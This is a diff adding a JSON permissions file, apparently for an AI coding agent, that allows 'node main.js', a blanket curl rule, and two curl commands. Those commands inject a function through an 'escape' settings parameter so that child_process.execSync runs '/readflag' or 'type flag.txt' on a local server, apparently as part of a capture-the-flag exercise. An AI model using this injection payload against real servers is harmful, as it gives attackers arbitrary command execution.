@@ -1,0 +1,10 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(node main.js)",
+      "Bash(curl -sg \"http://localhost:3000/dardmana?name=test&settings[view%20options][escape]=function\\(s\\){return%20process.mainModule.require\\('child_process'\\).execSync\\('/readflag'\\).toString\\(\\)}&client=true\")",
+      "Bash(curl -sg \"http://localhost:3000/dardmana?name=test&settings[view%20options][escape]=function\\(s\\){return%20process.mainModule.require\\('child_process'\\).execSync\\('type%20flag.txt'\\).toString\\(\\)}&client=true\")",
+      "Bash(curl:*)"
+    ]
+  }
+}
